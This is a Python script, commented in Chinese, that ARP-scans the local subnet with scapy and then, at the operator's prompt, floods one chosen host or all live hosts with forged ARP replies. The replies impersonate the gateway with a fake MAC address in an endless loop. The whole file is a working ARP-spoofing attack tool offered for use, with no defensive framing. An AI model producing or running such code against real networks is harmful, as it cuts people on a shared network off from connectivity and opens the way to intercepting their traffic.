# -*- coding: utf-8 -*
from time import sleep
from scapy.all import sr1
import HostNetwork
from scapy.layers.l2 import ARP
import threading  # 线程
import queue  # 队列

sur_data = []  # 要扫描的ip地址
ron_data = []  # 在线的ip地址
exitFlag = 0  # 控制队列循环是否退出
queueLock = threading.Lock()  # 锁
workQueue = queue.Queue(300)  # 创建一个队列
thrednum = 0  # 开启的线程数


# 线程类
class MyThread(threading.Thread):
    def __init__(self, fun):
        super().__init__()
        self.fun = fun

    def run(self):
        eval(self.fun)


# 均匀分配地址给每个线程
def DataAllot():
    global workQueue, exitFlag, queueLock
    da = []
    while not exitFlag:
        queueLock.acquire()  # 这里需要设置锁是因为如果一个线程判断队列不是空，就在这时时间片到了，然后停止，下一个线程把队列里最后一个取走了
        # 然后，当时间片又回到这个线程，但是这时里面已经没有数据了
        if not workQueue.empty():
            da.append(workQueue.get())
            queueLock.release()
        else:
            queueLock.release()

        # 等待所有线程开启完毕
        while True:
            if threading.active_count() >= thrednum:
                break

        sleep(2)  # 使每个线程从队列中取出的数据数量均匀
    return da


# arp扫描
def ArpScan(hostip, mac, timeout):
    """

    Args:
        hostip:
        mac:
        timeout:

    Returns:

    """
    global workQueue, exitFlag, queueLock
    da = DataAllot()

    if not len(da):
        queueLock.acquire()
        print("线程无值，结束线程")
        queueLock.release()
        return

    for ip in da:
        pt = sr1(ARP(psrc=hostip, hwsrc=mac, pdst=ip, op=1), timeout=timeout, verbose=0)
        if pt:
            queueLock.acquire()
            print(ip + "up")
            ron_data.append((pt.getlayer(ARP).hwsrc, pt.getlayer(ARP).psrc))
            queueLock.release()
        else:
            queueLock.acquire()
            print(str(ip) + "not found")
            queueLock.release()


# arp 攻击
def ArpAttack(hostip, rou):
    da = DataAllot()
    if not len(da):
        queueLock.acquire()
        print("线程无值，结束线程")
        queueLock.release()
        return
    while True:
        for mac in da:
            if mac[1] == hostip:
                continue
            queueLock.acquire()
            print("开始攻击"+mac[1])
            queueLock.release()
            pt = sr1(ARP(psrc=rou, hwsrc="aa:bb:cc:dd:ee:ff", pdst=mac[1], hwdst=mac[0], op=2), timeout=0, verbose=0)


def ArpAttackOne(ip, mac, host):
    while True:
            print("开始攻击"+ip)
            pt = sr1(ARP(psrc=host, hwsrc="aa:bb:cc:dd:ee:ff", pdst=ip, hwdst=mac, op=2), timeout=0, verbose=0)


if __name__ == "__main__":

    # 获取本机ip,mac,网关
    print("开始获取本机ip,route,mac.................")
    host = HostNetwork.HostNetwork()
    thread = []
    ipt = ""
    ipspt = host[0].split('.')
    del ipspt[3]
    for ipd in ipspt:
        ipt += ipd+'.'
    for ip in range(1, 255):
        st = ipt + str(ip)
        sur_data.append(st)

    timeout = int(input("请输入时间(时间越长扫描越精准，想精准建议10以上)："))

    print('开始扫描.....线程启动中........................')
    # 开启线程扫描
    thrednum = 100
    for _ in range(thrednum):
        t = MyThread("ArpScan(host[0],host[2],timeout)")
        thread.append(t)
        t.start()

    # 填充队列
    queueLock.acquire()
    for word in sur_data:
        workQueue.put(word)
    queueLock.release()

    # 等待队列清空
    while not workQueue.empty():
        pass

    # 通知线程是时候退出了
    exitFlag = 1

    # 等待所有线程完成
    for t in thread:
        t.join()

    print("本网段中存活的ip为：")
    print(ron_data)


    ans = input("是否对单人进行攻击？y/n")
    if ans == "y":
        targip = input("请输入上述列表指定ip:")
        for tar in ron_data:
            if tar[1] == targip:
                ArpAttackOne(tar[1] , tar[0] , host[1])



    read = input("是否开始ARP攻击？/yes/其它任意键退出：")
    if read != "yes":
        exit(0)

    # 开启死循环
    exitFlag = 0



    # 开启线程攻击
    print("开始攻击........线程启动中.....................")
    thrednum = 100
    for _ in range(thrednum):
        t = MyThread("ArpAttack(host[0],host[1])")
        thread.append(t)
        t.start()

        # 填充队列
    queueLock.acquire()
    for word in ron_data:
        workQueue.put(word)
    queueLock.release()

    # 等待队列清空
    while not workQueue.empty():
        pass

    # 通知线程是时候退出了
    exitFlag = 1

    # 等待所有线程完成
    for t in thread:
        t.join()